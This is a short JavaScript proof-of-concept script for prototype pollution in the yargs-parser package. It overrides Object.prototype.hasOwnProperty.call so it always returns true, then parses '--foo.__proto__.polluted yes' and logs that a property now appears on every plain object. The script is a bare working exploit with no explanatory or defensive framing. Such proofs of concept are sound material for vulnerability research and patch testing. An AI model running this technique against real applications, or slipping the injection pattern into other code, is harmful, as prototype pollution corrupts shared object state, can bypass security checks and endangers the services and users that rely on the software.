Object.prototype.hasOwnProperty.call = () => true;
console.log({}.polluted);
const parser = require('yargs-parser');
parser('--foo.__proto__.polluted yes');
console.log({}.polluted);